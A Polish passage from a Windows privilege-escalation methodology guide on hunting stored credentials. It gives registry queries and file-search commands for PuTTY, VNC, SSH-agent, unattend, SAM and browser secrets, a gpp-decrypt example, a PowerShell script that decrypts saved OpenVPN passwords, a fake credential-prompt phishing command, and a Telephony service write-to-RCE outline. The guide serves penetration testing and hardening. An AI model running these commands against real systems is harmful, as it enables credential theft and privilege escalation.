Oddzielny plik `Openfire\conf\openfire.xml` może ujawnić skonfigurowane porty konsoli administratora i interfejs powiązania nawet przy użyciu zewnętrznej bazy danych. Openfire zwykle wiąże konsolę administratora z loopback; lokalne konto nadal może połączyć się z tym adresem, jeśli proces nasłuchujący działa. Sprawdź łącznie rzeczywisty proces nasłuchujący, autoryzowaną rolę administratora, zasady przesyłania pluginów i tożsamość usługi Openfire. Administrator, który może zainstalować plugin, może spowodować uruchomienie jego kodu w kontekście usługi, co może oznaczać wysokie uprawnienia, jeśli usługa działa jako LocalSystem. Zgodne hasło konta ani czytelna ścieżka konfiguracji nie dowodzą same w sobie dostępu do konsoli administratora ani możliwości wykonania kodu. Zobacz [przewodnik dostawcy dotyczący instalacji i zarządzania pluginami](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) oraz [właściwość API przesyłania pluginów](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguracja serwera zarządzania danymi kryminalistycznymi

Konfiguracje serwera Velociraptor, często nazywane `server.config.yaml`, mogą zawierać `CA.private_key` wewnętrznego CA. Jeśli użytkownik o niższych uprawnieniach może odczytać ten klucz, może być w stanie wystawić certyfikat klienta API. To, czy prowadzi to do wyższych uprawnień, zależy od ról użytkowników serwera, dostępności API oraz tożsamości, w której działa serwer lub agent docelowy. Konfiguracja klienta zawiera inne dane; jej znalezienie nie dowodzi dostępu do CA serwera. W niektórych wdrożeniach prywatny klucz CA jest przechowywany offline, więc czytelna konfiguracja serwera może nie zawierać klucza podpisującego.

Na serwerze Windows sprawdź ACL **konfiguracji serwera** w katalogu instalacyjnym i wszelkich chronionych kopiach zapasowych. Jedną z możliwych lokalizacji jest `%ProgramFiles%\VelociraptorServer\server.config.yaml`; jeśli skonfigurowana ścieżka usługi jest inna, użyj jej. Potwierdź, że bieżąca tożsamość może odczytać plik i że `CA.private_key` faktycznie się w nim znajduje. Nie umieszczaj klucza prywatnego w logach ani wynikach enumeracji. Procedura dostawcy `config api_client` używa klucza CA do wystawienia certyfikatu klienta, ale wymagane jest również skuteczne uprawnienie po stronie serwera; jego utworzenie lub zmiana może wymagać dostępu do zapisu w magazynie danych albo ponownego uruchomienia usługi. Istniejąca uprzywilejowana tożsamość serwera może stanowić drogę dostępu nawet wtedy, gdy taki zapis jest niemożliwy. Zapytania API z uprawnieniami do wykonywania kodu działają w kontekście odpowiedniego serwera lub agenta, co może oznaczać wysokie uprawnienia.

Chroń konfigurację serwera i kopie zapasowe za pomocą restrykcyjnych ACL, w miarę możliwości przechowuj klucz podpisujący CA offline oraz ogranicz role API i dostęp do nasłuchujących procesów. Zobacz [dokumentację API Velociraptor](https://docs.velociraptor.app/docs/server_automation/server_api/) i [wytyczne dotyczące konfiguracji zabezpieczeń](https://docs.velociraptor.app/docs/deployment/security/).

### Poświadczenia PuTTY

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY to osobny menedżer sesji. Jego natywny zaszyfrowany magazyn może znajdować się w `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, a wyeksportowana kopia zapasowa sesji może mieć nazwę `sessions-backup.dat` i być przechowywana w innym miejscu. [Przewodnik SolarWinds dotyczący eksportu](https://thwack.solarwinds.com/discussion/comment/115591) informuje, że eksporty są szyfrowane hasłem i mogą zawierać sesje, klucze, skrypty, tagi oraz powiązania; [forum pomocy technicznej](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) wskazuje natywny magazyn. Najpierw sprawdź uprawnienia do plików i ścieżki. Znalezienie któregokolwiek z tych plików nie ujawnia hasła ani nie dowodzi, że zapisane poświadczenia są nadal ważne lub zapewniają wyższe uprawnienia.

### Klucze hosta SSH PuTTY

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Klucze SSH w rejestrze

Klucze prywatne SSH mogą być przechowywane w kluczu rejestru `HKCU\Software\OpenSSH\Agent\Keys`, więc sprawdź, czy nie ma tam czegoś interesującego:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Jeśli znajdziesz jakiś wpis w tej ścieżce, prawdopodobnie będzie to zapisany klucz SSH. Jest przechowywany w postaci zaszyfrowanej, ale można go łatwo odszyfrować za pomocą [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Więcej informacji o tej technice znajdziesz tutaj: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Jeśli usługa `ssh-agent` nie działa i chcesz, aby uruchamiała się automatycznie podczas rozruchu, wykonaj:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Wygląda na to, że ta technika nie jest już aktualna. Próbowałem utworzyć klucze ssh, dodać je za pomocą `ssh-add` i zalogować się przez ssh na maszynę. Rejestr HKCU\Software\OpenSSH\Agent\Keys nie istnieje, a procmon nie wykrył użycia `dpapi.dll` podczas uwierzytelniania kluczem asymetrycznym.

### Pliki nienadzorowane

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Możesz też wyszukać te pliki za pomocą **metasploit**: _post/windows/gather/enum_unattend_

Przykładowa zawartość:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Kopie zapasowe SAM i SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Czytelne pliki kopii zapasowych Windows Imaging (`.wim`) mogą również zawierać offline’owe hive’y `SAM`, `SECURITY` i `SYSTEM`. W pierwszej kolejności sprawdzaj lokalnie dostępne katalogi kopii zapasowych lub obrazów i przed wypakowaniem czegokolwiek sprawdź **nazwy elementów** obrazu; sama nazwa pliku `.wim` nie dowodzi, że zawiera hive’y, a standardowe obrazy `install.wim`, `boot.wim` i obrazy odzyskiwania często prowadzą donikąd. Udział SMB to osobna ścieżka dostępu — sprawdzaj go tylko wtedy, gdy mieści się w zakresie testu. Zobacz wskazówki Microsoftu dotyczące [obrazów systemu Windows](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) oraz [pliki hive rejestru](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Dane uwierzytelniające do chmury

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Wyszukaj plik o nazwie **SiteList.xml**

### Hasło GPP z pamięci podręcznej

Dostępna była wcześniej funkcja umożliwiająca wdrażanie niestandardowych lokalnych kont administratora na grupie komputerów za pomocą Group Policy Preferences (GPP). Ta metoda miała jednak poważne luki w zabezpieczeniach. Po pierwsze, obiekty Group Policy (GPO), przechowywane jako pliki XML w SYSVOL, były dostępne dla każdego użytkownika domeny. Po drugie, hasła w tych GPP, zaszyfrowane algorytmem AES256 z użyciem publicznie udokumentowanego klucza domyślnego, mogły zostać odszyfrowane przez każdego uwierzytelnionego użytkownika. Stanowiło to poważne zagrożenie, ponieważ mogło umożliwić użytkownikom uzyskanie podwyższonych uprawnień.

Aby ograniczyć to zagrożenie, opracowano funkcję skanującą lokalnie buforowane pliki GPP w poszukiwaniu niepustego pola „cpassword”. Po znalezieniu takiego pliku funkcja odszyfrowuje hasło i zwraca niestandardowy obiekt PowerShell. Obiekt zawiera informacje o GPP i lokalizacji pliku, co ułatwia identyfikację tej luki w zabezpieczeniach oraz jej usunięcie.

Wyszukaj te pliki w `C:\ProgramData\Microsoft\Group Policy\history` lub w _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (przed Windows Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Aby odszyfrować cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Używanie crackmapexec do uzyskania haseł:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### Konfiguracja Web w IIS

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Przykład pliku web.config zawierającego dane uwierzytelniające:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Archiwa kopii zapasowych w katalogu głównym witryny IIS

Stare archiwum ZIP umieszczone bezpośrednio w katalogu głównym witryny może udostępniać wcześniejsze pliki konfiguracyjne i możliwe do ponownego wykorzystania dane uwierzytelniające. Przed uznaniem tego za narażenie sprawdź skonfigurowaną ścieżkę fizyczną witryny oraz to, czy archiwum jest faktycznie dostępne przez HTTP. Domyślna ścieżka `C:\inetpub\wwwroot` jest tylko jedną z możliwości. Szybka lokalna inwentaryzacja może wyświetlić nazwy i rozmiary plików bez otwierania archiwów:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Nazwa archiwum nie dowodzi, że zawiera ono sekret ani że odzyskane poświadczenie zapewnia wyższe uprawnienia.

### Poświadczenia OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Dzienniki

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Poproś o dane uwierzytelniające

Zawsze możesz **poprosić użytkownika o podanie swoich danych uwierzytelniających lub danych innego użytkownika**, jeśli uważasz, że może je znać (pamiętaj, że bezpośrednie **proszenie** klienta o **dane uwierzytelniające** jest naprawdę **ryzykowne**):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Możliwe nazwy plików zawierających dane uwierzytelniające**

Znane pliki, które jakiś czas temu zawierały **hasła** zapisane **jawnym tekstem** lub w formacie **Base64**

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Bazy danych Password Safe v3 często używają rozszerzenia `.psafe3`. Traktuj plik o pasującej nazwie jako potencjalny zaszyfrowany sejf; jego obecność nie oznacza, że możesz go odczytać, odblokować ani użyć zapisanych w nim poświadczeń. Podczas sprawdzania, gdzie przechowywane są takie pliki, przeglądaj dostępne profile użytkowników i skonfigurowane katalogi główne udziałów plików.

Czytelny plik KeePass `.kdbx` jest podobnie tylko wskazówką, że może istnieć zaszyfrowany sejf. Odblokowanie go wymaga właściwego hasła głównego oraz wszelkich skonfigurowanych plików kluczy lub czynników związanych z kontem. Jeśli autoryzowany audyt znajdzie w jednym z wpisów parę hashy LM:NT, sprawdź wskazane konto oraz to, czy hash NT jest aktualny i akceptowany przez usługę NTLM celu, zanim rozważysz [pass-the-hash](../ntlm/README.md#pass-the-hash). Wpis w sejfie sam w sobie nie nadaje uprawnień Administrator ani SYSTEM; dostęp do usługi zdalnej, uprawnienia konta i ewentualny osobny krok uruchomienia usługi również muszą być zapewnione. Inwentaryzacja powinna wykazywać ścieżkę do sejfu i możliwość jego odczytu, a nie wyświetlać bazy danych ani zapisanych poświadczeń.

Przeszukaj wszystkie proponowane pliki:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Dane uwierzytelniające w Koszu

Sprawdź dostępne wpisy Kosza pod kątem usuniętych kopii zapasowych i archiwów konfiguracyjnych, a także plików, których nazwy wyraźnie wskazują na dane uwierzytelniające. Przydatna kopia zapasowa `.7z`, `.zip` lub `.rar` może mieć kilka miesięcy i zwyczajną nazwę. Windows przechowuje pierwotną ścieżkę i czas usunięcia w rekordzie `$I`, a usunięty plik jako odpowiadający mu wpis `$R`; przed otwarciem archiwum sprawdź metadane i uprawnienia bieżącej tożsamości do odczytu. Widoczność zależy od woluminu, identyfikatora SID użytkownika i uprawnień do plików, więc pusta lista nie dowodzi, że nie istnieje żadna możliwa do odzyskania kopia zapasowa. Traktuj nazwę archiwum jako kandydat do sprawdzenia, a nie dowód, że zawiera ono prawidłowy sekret.

Dostępny usunięty plik `.pfx` może również wskazywać na możliwość **code-signing**. Jeśli zawiera dostępny klucz prywatny, można nim podpisać zmodyfikowany skrypt PowerShell; [PowerShell wymaga certyfikatu code-signing z kluczem prywatnym](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), a [reguły wydawcy AppLocker oceniają tożsamość podpisującego i zakres reguły](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Wykonanie skryptu na koncie innego użytkownika wymaga, aby bieżąca tożsamość mogła zmodyfikować konkretny skrypt, obowiązująca reguła akceptowała jego uzyskany podpis dla tego skryptu i konta docelowego, a zadanie zaplanowane lub inny proces o wyższych uprawnieniach faktycznie go uruchamiał. Sama nazwa pliku `.pfx`, temat certyfikatu ani możliwość zapisu do skryptu nie potwierdzają istnienia całego łańcucha. Przed otwarciem materiału z kluczem prywatnym lub uruchomieniem zadania sprawdź metadane, ACL-e, zasady i polecenie zaplanowane do wykonania.

Sprawdź również dostępne bazy danych profili klientów komunikacyjnych, notatki i odebrane pliki pod kątem wskazówek dotyczących danych uwierzytelniających. Eksport klucza odzyskiwania BitLocker może być zapisany jako HTML lub TXT, czasem w nazwanym archiwum kopii zapasowej. Takie materiały mogą umożliwić dostęp do osobnego zaszyfrowanego woluminu danych zawierającego starsze kopie zapasowe; sprawdzaj wolumin i archiwum tylko wtedy, gdy masz do tego uprawnienia. Jeśli kopia zapasowa zawiera `NTDS.dit`, odzyskanie poświadczeń domeny w trybie offline wymaga również pasującego ula `SYSTEM`, jak opisano w [procedurze dotyczącej kopii zapasowych i grup uprzywilejowanych](../active-directory-methodology/privileged-groups-and-token-privileges.md). Same nazwy plików i zablokowany wolumin nie dowodzą, że istnieje użyteczny klucz odzyskiwania ani kopia zapasowa domeny.

Do **odzyskiwania haseł** zapisanych przez kilka programów można użyć: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### W rejestrze

**Inne możliwe klucze rejestru zawierające dane uwierzytelniające**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Wyodrębnianie kluczy openssh z rejestru.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia przeglądarek

Sprawdź, czy istnieją bazy danych, w których przechowywane są hasła z **Chrome, Edge lub Firefox**.\
Sprawdź też historię, zakładki i ulubione w przeglądarkach — być może przechowywane są tam **hasła**.

W przypadku standardowego profilu **Default** przeglądarki Edge bieżącego użytkownika plik `Login Data` znajduje się w `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, a plik `Local State` — w nadrzędnym katalogu `User Data`. [Microsoft opisuje domyślną lokalizację profilu](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); inny profil lub zasada `UserDataDir` może zmienić tę lokalizację. Sama obecność plików wskazuje jedynie potencjalne miejsce przechowywania danych logowania: sprawdź, czy pliki są czytelne, czy dostępny jest kontekst DPAPI właściwego użytkownika lub inne autoryzowane materiały kluczowe oraz czy zapisane logowanie należy do konta o wyższych uprawnieniach. Samo wyliczenie ścieżek nie wymaga otwierania bazy danych ani wyświetlania odszyfrowanych haseł.

W przypadku Firefoksa [Mozilla opisuje](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile), że pliki `key4.db` i `logins.json` w profilu tworzą parę: plik klucza i plik zaszyfrowanych danych logowania. Ich obecność wskazuje jedynie potencjalne miejsce przechowywania danych: sprawdź, czy oba pliki są czytelne, czy zawierają zapisane wpisy oraz czy klucz jest chroniony hasłem głównym, zanim uznasz, że dane logowania można wykorzystać. Jeśli odzyskane dane logowania należą do konta domenowego, osobno sprawdź efektywne uprawnienia tego konta do zarządzania grupami oraz uprawnienia grupy do [odczytu lub odszyfrowywania haseł LAPS](../active-directory-methodology/laps.md); same artefakty przeglądarki nie potwierdzają możliwości uzyskania uprawnień administratora.

Narzędzia do wyodrębniania haseł z przeglądarek:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** to technologia wbudowana w system operacyjny Windows, która umożliwia **komunikację** między składnikami oprogramowania napisanymi w różnych językach. Każdy składnik COM jest **identyfikowany za pomocą identyfikatora klasy (CLSID)**, a każdy składnik udostępnia funkcje za pośrednictwem co najmniej jednego interfejsu, identyfikowanego za pomocą identyfikatora interfejsu (IID).

Klasy i interfejsy COM są definiowane w rejestrze odpowiednio pod kluczami **HKEY\CLASSES\ROOT\CLSID** i **HKEY\CLASSES\ROOT\Interface**. Ten rejestr powstaje przez połączenie **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

W kluczach CLSID tego rejestru znajduje się podklucz **InProcServer32**, który zawiera **wartość domyślną** wskazującą na **DLL** oraz wartość o nazwie **ThreadingModel**, która może mieć wartość **Apartment** (jednowątkowy), **Free** (wielowątkowy), **Both** (jedno- lub wielowątkowy) albo **Neutral** (niezależny od wątku).

![Historia przeglądarek — COM DLL Overwriting: W kluczach CLSID tego rejestru znajduje się podklucz InProcServer32, który zawiera wartość domyślną wskazującą na DLL oraz wartość...](<../../images/image (729).png>)

Zasadniczo, jeśli możesz **nadpisać dowolny plik DLL**, który zostanie uruchomiony, możesz **eskalować uprawnienia**, jeśli ten plik DLL zostanie uruchomiony przez innego użytkownika.

Aby dowiedzieć się, jak atakujący wykorzystują COM Hijacking jako mechanizm utrzymywania dostępu, sprawdź:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Wyszukiwanie haseł w plikach i rejestrze**

**Wyszukiwanie zawartości plików**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Wyszukiwanie pliku o określonej nazwie**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Przeszukaj rejestr w poszukiwaniu nazw kluczy i haseł**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Narzędzia do wyszukiwania haseł

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **jest wtyczką msf**. Stworzyłem tę wtyczkę, aby **automatycznie uruchamiać każdy moduł POST Metasploit, który wyszukuje dane uwierzytelniające** na komputerze ofiary.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) automatycznie wyszukuje wszystkie pliki zawierające hasła wymienione na tej stronie.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) to kolejne świetne narzędzie do wyodrębniania haseł z systemu.

Narzędzie [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) wyszukuje **sesje**, **nazwy użytkowników** i **hasła** w przypadku kilku narzędzi, które zapisują te dane w postaci jawnego tekstu (PuTTY, WinSCP, FileZilla, SuperPuTTY i RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Ujawnione uchwyty

Wyobraź sobie, że **proces działający jako SYSTEM otwiera nowy proces** (`OpenProcess()`) z **pełnym dostępem**. Ten sam proces **tworzy też nowy proces** (`CreateProcess()`) **z niskimi uprawnieniami, który dziedziczy wszystkie otwarte uchwyty procesu głównego**.\
Jeśli masz **pełny dostęp do procesu o niskich uprawnieniach**, możesz przejąć **otwarty uchwyt do utworzonego procesu uprzywilejowanego** za pomocą `OpenProcess()` i **wstrzyknąć shellcode**.\
[Przeczytaj ten przykład, aby dowiedzieć się więcej o **wykrywaniu i wykorzystywaniu tej podatności**.](leaked-handle-exploitation.md)\
[Przeczytaj też **ten wpis, w którym dokładniej wyjaśniono, jak testować i nadużywać większej liczby otwartych uchwytów procesów i wątków dziedziczonych z różnymi poziomami uprawnień (nie tylko pełnym dostępem)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Segmenty pamięci współdzielonej, nazywane **potokami**, umożliwiają komunikację między procesami i przesyłanie danych.

Windows udostępnia funkcję o nazwie **Named Pipes**, która pozwala niepowiązanym procesom współdzielić dane, nawet przez różne sieci. Przypomina to architekturę klient/serwer, w której role określa się jako **serwer named pipe** i **klient named pipe**.

Gdy **klient** wysyła dane przez potok, **serwer**, który go skonfigurował, może **przyjąć tożsamość** **klienta**, o ile ma wymagane uprawnienia **SeImpersonate**. Znalezienie **uprzywilejowanego procesu**, który komunikuje się przez potok, pod który możesz się podszyć, daje możliwość **uzyskania wyższych uprawnień** poprzez przyjęcie tożsamości tego procesu, gdy wejdzie on w interakcję z utworzonym przez ciebie potokiem. Instrukcje przeprowadzenia takiego ataku znajdziesz [**tutaj**](named-pipe-client-impersonation.md) i [**tutaj**](#from-high-integrity-to-system).

Poniższe narzędzie pozwala też **przechwytywać komunikację przez named pipe za pomocą narzędzia takiego jak Burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **To narzędzie pozwala wyświetlić listę wszystkich potoków i je przeglądać, aby znaleźć privescs:** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Zdalny zapis DWORD przez Telephony tapsrv prowadzący do RCE

Usługa Telephony (TapiSrv) w trybie serwera udostępnia `\\pipe\\tapsrv` (MS-TRP). Zdalny, uwierzytelniony klient może nadużyć asynchronicznej ścieżki zdarzeń opartej na mailslotach, aby zmienić `ClientAttach` w dowolny **zapis 4 bajtów** do istniejącego pliku, do którego zapis ma `NETWORK SERVICE`, a następnie uzyskać uprawnienia administratora Telephony i załadować dowolną bibliotekę DLL jako usługa. Pełny przebieg:

- `ClientAttach` z `pszDomainUser` ustawionym na istniejącą ścieżkę, do której można zapisywać → usługa otwiera ją za pomocą `CreateFileW(..., OPEN_EXISTING)` i używa do asynchronicznego zapisu zdarzeń.
- Każde zdarzenie zapisuje do tego uchwytu kontrolowany przez atakującego `InitContext` z `Initialize`. Zarejestruj aplikację linii za pomocą `LRegisterRequestRecipient` (`Req_Func 61`), wywołaj `TRequestMakeCall` (`Req_Func 121`), pobierz dane przez `GetAsyncEvents` (`Req_Func 0`), a następnie wyrejestruj aplikację lub zamknij połączenie, aby powtarzać deterministyczne zapisy.
- Dodaj siebie do `[TapiAdministrators]` w `C:\Windows\TAPI\tsec.ini`, połącz się ponownie, a następnie wywołaj `GetUIDllName` ze ścieżką do dowolnej biblioteki DLL, aby uruchomić `TSPI_providerUIIdentify` jako `NETWORK SERVICE`.

Więcej szczegółów:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Różne

### Rozszerzenia plików, które mogą uruchamiać kod w Windows

Zajrzyj na stronę **[https://filesec.io/](https://filesec.io/)**

### Nadużywanie handlerów protokołów / ShellExecute za pośrednictwem rendererów Markdown

Klikalne linki Markdown przekazywane do `ShellExecuteExW` mogą uruchamiać niebezpieczne handlery URI (`file:`, `ms-appinstaller:` lub dowolny zarejestrowany schemat) i wykonywać pliki kontrolowane przez atakującego jako bieżący użytkownik. Zobacz:

{{#ref}}
../protocol-handler-shell-execute-abuse.md
{{#endref}}

### **Monitorowanie wierszy poleceń pod kątem haseł**

